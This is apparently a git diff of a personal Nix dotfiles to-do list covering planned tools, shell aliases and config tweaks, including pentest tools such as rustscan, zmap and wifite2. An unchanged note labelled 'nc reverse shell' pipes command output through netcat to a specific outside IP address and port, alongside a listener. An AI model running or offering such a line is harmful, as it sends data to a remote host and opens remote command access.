@@ -160,7 +160,6 @@ pkgs.mkShell {
 - better way to work with functions in shell.nix
 - GUI
   - move badapple gif and mp3 outsude of git (or genereate them idk)
-  - `GDK_GL=disable ayugram-desktop` for webapps
   - obs
     - quick replay (import scenes)
       - battery/ac based quality
@@ -170,7 +169,6 @@ pkgs.mkShell {
 #### New software
 
 - zsh or fish (or bash lol)
-- nmap to rustscan
 - [dive](https://github.com/wagoodman/dive)
 - [Mosh: the mobile shell](https://mosh.org/)
 - <https://github.com/pojntfx/octarchive>
@@ -184,19 +182,15 @@ pkgs.mkShell {
     - seclists
     - frida-tools
     - wifite2
-    - zmap
-    - rustscan
-  - editor
-    - helix
+    - nmap alts
+      - rustscan
+      - zmap
 
 #### Alias
 
 - 'sudo '
-- pipi
-- pyvcr
-- pyv
-- py
 - fzf
+  - !autocompletion
   - wgu selector
     - best location for config files
       - agenix secrets?
@@ -210,7 +204,7 @@ pkgs.mkShell {
 - dcup prod
 - wsl `find / -not -path '/mnt/*'`
 - `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
-- git config core.editor=code -w -n
+- git config core.editor=code --wait --new-window
 - nc reverse shell
   - exec command 2>&1 | nc 176.117.72.208 12345
   - nc -l -p 12345 2>&1 | tee -a keklol
@@ -218,7 +212,6 @@ pkgs.mkShell {
 - nvf current dir or sudo or ignore /proc etc
 - llt ls tree
   - or lll
-- alias ip='ip --color=auto'
 - proto outdated --update
 
 #### Other
@@ -239,11 +232,6 @@ pkgs.mkShell {
     - disable all other
     - batman ?
   - init.lua vim types
-- python
-  - direnv
-  - uv2nix
-- starship
-  - remove versions
 - .editorconfig conf
   - make it global ?
 
